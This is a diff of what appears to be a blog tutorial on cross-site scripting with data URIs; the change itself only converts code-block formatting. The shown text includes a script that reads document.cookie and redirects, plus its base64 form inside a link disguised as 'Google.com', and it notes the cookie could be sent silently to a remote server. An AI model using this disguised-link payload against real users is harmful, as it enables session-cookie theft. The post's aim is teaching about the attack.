@@ -19,9 +19,9 @@ Lets see an example:
 
 First off, this is just an example - so it's pretty simple.  But I could make a request to a remote server through an image.src or an ajax call.  Here, I'm just alerting the cookie to the screen (note, if this wasn't an alert, the average user would not notice.)
 
-{% highlight HTML %}
+```html
 <script>alert("cookie steal: "+document.cookie);window.location.href='http://www.google.com';</script>
-{% endhighlight %}
+```
 
 Which, when base64 encoded is
 
@@ -31,9 +31,9 @@ Which, when base64 encoded is
 
 Put it all together:
 
-{% highlight HTML %}
+```html
 <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiY29va2llIHN0ZWFsOiAiK2RvY3VtZW50LmNvb2tpZSk7d2luZG93LmxvY2F0aW9uLmhyZWY9J2h0dHA6Ly93d3cuZ29vZ2xlLmNvbSc7PC9zY3JpcHQ+">Google.com</a>
-{% endhighlight %}
+```
 
 
 
